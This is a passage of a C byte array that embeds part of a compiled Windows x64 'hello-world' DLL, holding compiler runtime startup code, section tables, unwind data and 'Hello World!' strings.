	0x98, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x89, 0x85, 0x88,
	0x00, 0x00, 0x00, 0xE8, 0x00, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xC8,
	0x04, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0xC7, 0x44, 0x24, 0x50,
	0x15, 0x00, 0x00, 0x40, 0xC7, 0x44, 0x24, 0x54, 0x01, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0x8A, 0x04, 0x00, 0x00, 0x83, 0xF8, 0x01, 0x48, 0x8D, 0x44,
	0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x45, 0xF0, 0x0F,
	0x94, 0xC3, 0x48, 0x89, 0x44, 0x24, 0x48, 0x33, 0xC9, 0xFF, 0x15, 0xB1,
	0x04, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xFF, 0x15, 0xAE, 0x04,
	0x00, 0x00, 0x85, 0xC0, 0x75, 0x0A, 0xF6, 0xDB, 0x1B, 0xC0, 0x21, 0x05,
	0x78, 0x1A, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0xD0, 0x05, 0x00, 0x00,
	0x48, 0x81, 0xC4, 0xC0, 0x05, 0x00, 0x00, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48,
	0x83, 0xEC, 0x20, 0x48, 0x8D, 0x1D, 0x86, 0x09, 0x00, 0x00, 0x48, 0x8D,
	0x35, 0x7F, 0x09, 0x00, 0x00, 0xEB, 0x16, 0x48, 0x8B, 0x3B, 0x48, 0x85,
	0xFF, 0x74, 0x0A, 0x48, 0x8B, 0xCF, 0xE8, 0x69, 0x00, 0x00, 0x00, 0xFF,
	0xD7, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x3B, 0xDE, 0x72, 0xE5, 0x48, 0x8B,
	0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20,
	0x5F, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74,
	0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x1D, 0x4A, 0x09,
	0x00, 0x00, 0x48, 0x8D, 0x35, 0x43, 0x09, 0x00, 0x00, 0xEB, 0x16, 0x48,
	0x8B, 0x3B, 0x48, 0x85, 0xFF, 0x74, 0x0A, 0x48, 0x8B, 0xCF, 0xE8, 0x1D,
	0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x3B, 0xDE,
	0x72, 0xE5, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38,
	0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0x48, 0xFF, 0x25, 0x9D,
	0x04, 0x00, 0x00, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x7C,
	0x24, 0x18, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x20, 0x83, 0x65,
	0xE8, 0x00, 0x33, 0xC9, 0x33, 0xC0, 0xC7, 0x05, 0x8C, 0x13, 0x00, 0x00,
	0x02, 0x00, 0x00, 0x00, 0x0F, 0xA2, 0x44, 0x8B, 0xC1, 0xC7, 0x05, 0x79,
	0x13, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x81, 0xF1, 0x63, 0x41, 0x4D,
	0x44, 0x44, 0x8B, 0xCA, 0x44, 0x8B, 0xD2, 0x41, 0x81, 0xF1, 0x65, 0x6E,
	0x74, 0x69, 0x41, 0x81, 0xF2, 0x69, 0x6E, 0x65, 0x49, 0x41, 0x81, 0xF0,
	0x6E, 0x74, 0x65, 0x6C, 0x45, 0x0B, 0xD0, 0x44, 0x8B, 0xDB, 0x44, 0x8B,
	0x05, 0x67, 0x19, 0x00, 0x00, 0x41, 0x81, 0xF3, 0x41, 0x75, 0x74, 0x68,
	0x45, 0x0B, 0xD9, 0x8B, 0xD3, 0x44, 0x0B, 0xD9, 0x81, 0xF2, 0x47, 0x65,
	0x6E, 0x75, 0x33, 0xC9, 0x8B, 0xF8, 0x44, 0x0B, 0xD2, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0x0F, 0xA2, 0x89, 0x45, 0xF0, 0x44, 0x8B, 0xC9, 0x44, 0x89,
	0x4D, 0xF8, 0x8B, 0xC8, 0x89, 0x5D, 0xF4, 0x89, 0x55, 0xFC, 0x45, 0x85,
	0xD2, 0x75, 0x52, 0x48, 0x83, 0x0D, 0x11, 0x13, 0x00, 0x00, 0xFF, 0x41,
	0x83, 0xC8, 0x04, 0x25, 0xF0, 0x3F, 0xFF, 0x0F, 0x44, 0x89, 0x05, 0x15,
	0x19, 0x00, 0x00, 0x3D, 0xC0, 0x06, 0x01, 0x00, 0x74, 0x28, 0x3D, 0x60,
	0x06, 0x02, 0x00, 0x74, 0x21, 0x3D, 0x70, 0x06, 0x02, 0x00, 0x74, 0x1A,
	0x05, 0xB0, 0xF9, 0xFC, 0xFF, 0x83, 0xF8, 0x20, 0x77, 0x1B, 0x48, 0xBB,
	0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x0F, 0xA3, 0xC3,
	0x73, 0x0B, 0x41, 0x83, 0xC8, 0x01, 0x44, 0x89, 0x05, 0xDB, 0x18, 0x00,
	0x00, 0x45, 0x85, 0xDB, 0x75, 0x19, 0x81, 0xE1, 0x00, 0x0F, 0xF0, 0x0F,
	0x81, 0xF9, 0x00, 0x0F, 0x60, 0x00, 0x72, 0x0B, 0x41, 0x83, 0xC8, 0x04,
	0x44, 0x89, 0x05, 0xBD, 0x18, 0x00, 0x00, 0xB8, 0x07, 0x00, 0x00, 0x00,
	0x89, 0x55, 0xE0, 0x44, 0x89, 0x4D, 0xE4, 0x3B, 0xF8, 0x7C, 0x24, 0x33,
	0xC9, 0x0F, 0xA2, 0x89, 0x45, 0xF0, 0x89, 0x5D, 0xF4, 0x89, 0x4D, 0xF8,
	0x89, 0x55, 0xFC, 0x89, 0x5D, 0xE8, 0x0F, 0xBA, 0xE3, 0x09, 0x73, 0x0B,
	0x41, 0x83, 0xC8, 0x02, 0x44, 0x89, 0x05, 0x89, 0x18, 0x00, 0x00, 0x41,
	0x0F, 0xBA, 0xE1, 0x14, 0x73, 0x6E, 0xC7, 0x05, 0x5C, 0x12, 0x00, 0x00,
	0x02, 0x00, 0x00, 0x00, 0xC7, 0x05, 0x56, 0x12, 0x00, 0x00, 0x06, 0x00,
	0x00, 0x00, 0x41, 0x0F, 0xBA, 0xE1, 0x1B, 0x73, 0x53, 0x41, 0x0F, 0xBA,
	0xE1, 0x1C, 0x73, 0x4C, 0x33, 0xC9, 0x0F, 0x01, 0xD0, 0x48, 0xC1, 0xE2,
	0x20, 0x48, 0x0B, 0xD0, 0x48, 0x89, 0x55, 0x10, 0x48, 0x8B, 0x45, 0x10,
	0x24, 0x06, 0x3C, 0x06, 0x75, 0x32, 0x8B, 0x05, 0x28, 0x12, 0x00, 0x00,
	0x83, 0xC8, 0x08, 0xC7, 0x05, 0x17, 0x12, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0xF6, 0x45, 0xE8, 0x20, 0x89, 0x05, 0x11, 0x12, 0x00, 0x00, 0x74,
	0x13, 0x83, 0xC8, 0x20, 0xC7, 0x05, 0xFE, 0x11, 0x00, 0x00, 0x05, 0x00,
	0x00, 0x00, 0x89, 0x05, 0xFC, 0x11, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24,
	0x38, 0x33, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20,
	0x5D, 0xC3, 0xCC, 0xCC, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC,
	0x33, 0xC0, 0x39, 0x05, 0xEC, 0x11, 0x00, 0x00, 0x0F, 0x95, 0xC0, 0xC3,
	0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x25, 0x3A, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x44, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x36, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x70, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x62, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x54, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x76, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x38, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x2A, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x34, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x4E, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x50, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x5A, 0x02,
	0x00, 0x00, 0xFF, 0x25, 0x94, 0x01, 0x00, 0x00, 0xB0, 0x01, 0xC3, 0xCC,
	0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0x8A,
	0x4D, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xE9, 0xF8, 0xF9, 0xFF, 0xFF,
	0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0xE8, 0x21,
	0xF8, 0xFF, 0xFF, 0x8A, 0x4D, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xE9,
	0xDC, 0xF9, 0xFF, 0xFF, 0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x30, 0x48,
	0x8B, 0xEA, 0x48, 0x8B, 0x01, 0x8B, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x28,
	0x89, 0x54, 0x24, 0x20, 0x4C, 0x8D, 0x0D, 0x91, 0xF1, 0xFF, 0xFF, 0x4C,
	0x8B, 0x45, 0x70, 0x8B, 0x55, 0x68, 0x48, 0x8B, 0x4D, 0x60, 0xE8, 0x51,
	0xF7, 0xFF, 0xFF, 0x90, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0xC3, 0xCC, 0x40,
	0x55, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0x01, 0x33, 0xC9, 0x81, 0x38, 0x05,
	0x00, 0x00, 0xC0, 0x0F, 0x94, 0xC1, 0x8B, 0xC1, 0x5D, 0xC3, 0xCC, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x5C, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x46, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x2B, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x16, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xCA, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB6, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x84, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x68, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x3A, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x26, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xC6, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x18, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF8, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x9C, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x7A, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x29, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x4E, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x29, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xD4, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEC, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xFA, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x1E, 0x00, 0x80,
	0x01, 0x00, 0x00, 0x00, 0xC0, 0x1E, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x30, 0x00, 0x80,
	0x01, 0x00, 0x00, 0x00, 0xF0, 0x30, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
	0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x21,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x77, 0x6F,
	0x72, 0x6C, 0x64, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x7B, 0xA7, 0x5A,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00,
	0xA4, 0x22, 0x00, 0x00, 0xA4, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x73, 0x7B, 0xA7, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00,
	0x14, 0x00, 0x00, 0x00, 0xF4, 0x22, 0x00, 0x00, 0xF4, 0x16, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x73, 0x7B, 0xA7, 0x5A, 0x00, 0x00, 0x00, 0x00,
	0x0D, 0x00, 0x00, 0x00, 0x54, 0x02, 0x00, 0x00, 0x08, 0x23, 0x00, 0x00,
	0x08, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x7B, 0xA7, 0x5A,
	0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x08, 0x21, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x10, 0x21, 0x00, 0x80,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x52, 0x53, 0x44, 0x53, 0x51, 0xD1, 0x7E, 0x63, 0xA6, 0x66, 0x05, 0x49,
	0x98, 0x0A, 0xEF, 0x4E, 0x79, 0x4A, 0xB3, 0x7E, 0x01, 0x00, 0x00, 0x00,
	0x43, 0x3A, 0x5C, 0x70, 0x72, 0x6F, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x5C,
	0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x2D, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x2D,
	0x64, 0x6C, 0x6C, 0x5C, 0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5C,
	0x78, 0x36, 0x34, 0x5C, 0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x2D, 0x77, 0x6F,
	0x72, 0x6C, 0x64, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x13, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x12, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00,
	0xB0, 0x0E, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E,
	0x00, 0x00, 0x00, 0x00, 0xB0, 0x1E, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x30, 0x30, 0x00,
	0xC2, 0x1E, 0x00, 0x00, 0x81, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
	0x74, 0x24, 0x78, 0x00, 0x00, 0x20, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x00, 0x00, 0x00, 0x00,
	0x08, 0x21, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x2E, 0x30, 0x30, 0x63,
	0x66, 0x67, 0x00, 0x00, 0x18, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
	0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x00, 0x00, 0x00, 0x00,
	0x20, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
	0x24, 0x58, 0x43, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x28, 0x21, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41,
	0x00, 0x00, 0x00, 0x00, 0x30, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
	0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x5A, 0x00, 0x00, 0x00, 0x00,
	0x38, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
	0x24, 0x58, 0x50, 0x41, 0x00, 0x00, 0x00, 0x00, 0x40, 0x21, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x5A,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
	0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x41, 0x00, 0x00, 0x00, 0x00,
	0x50, 0x21, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
	0x24, 0x58, 0x54, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x60, 0x21, 0x00, 0x00,
	0x44, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0xA4, 0x22, 0x00, 0x00, 0xBC, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00,
	0x60, 0x25, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63,
	0x24, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00, 0x68, 0x25, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x49, 0x5A, 0x5A,
	0x00, 0x00, 0x00, 0x00, 0x70, 0x25, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
	0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00,
	0x78, 0x25, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63,
	0x24, 0x54, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x80, 0x25, 0x00, 0x00,
	0x50, 0x01, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x2E, 0x65, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x38, 0x27, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00,
	0x88, 0x27, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x27, 0x00, 0x00,
	0x08, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34,
	0x00, 0x00, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00, 0xC8, 0x02, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74,
	0x61, 0x00, 0x00, 0x00, 0x40, 0x30, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00,
	0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0xC8, 0x01, 0x00, 0x00, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x00, 0x50, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x2E, 0x67, 0x66, 0x69,
	0x64, 0x73, 0x24, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00,
	0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x31,
	0x00, 0x00, 0x00, 0x00, 0x60, 0x60, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00,
	0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00,
	0x04, 0x62, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x11, 0x15, 0x08, 0x00,
	0x15, 0x74, 0x09, 0x00, 0x15, 0x64, 0x07, 0x00, 0x15, 0x34, 0x06, 0x00,
	0x15, 0x32, 0x11, 0xE0, 0x50, 0x1E, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x2F, 0x11, 0x00, 0x00, 0xBC, 0x11, 0x00, 0x00, 0xC2, 0x1E, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x50,
	0x11, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x08, 0x00, 0x0F, 0x34, 0x06, 0x00,
	0x0F, 0x32, 0x0B, 0x70, 0x50, 0x1E, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x56, 0x12, 0x00, 0x00, 0x74, 0x12, 0x00, 0x00, 0xD9, 0x1E, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x09, 0x1A, 0x06, 0x00, 0x1A, 0x34, 0x0F, 0x00,
	0x1A, 0x72, 0x16, 0xE0, 0x14, 0x70, 0x13, 0x60, 0x50, 0x1E, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0xD9, 0x12, 0x00, 0x00, 0x83, 0x13, 0x00, 0x00,
	0xF5, 0x1E, 0x00, 0x00, 0x83, 0x13, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00,
	0x06, 0x52, 0x02, 0x50, 0x01, 0x09, 0x01, 0x00, 0x09, 0x62, 0x00, 0x00,
	0x01, 0x08, 0x04, 0x00, 0x08, 0x72, 0x04, 0x70, 0x03, 0x60, 0x02, 0x30,
	0x09, 0x04, 0x01, 0x00, 0x04, 0x22, 0x00, 0x00, 0x50, 0x1E, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x3B, 0x18, 0x00, 0x00, 0xC6, 0x18, 0x00, 0x00,
	0x2B, 0x1F, 0x00, 0x00, 0xC6, 0x18, 0x00, 0x00, 0x01, 0x02, 0x01, 0x00,
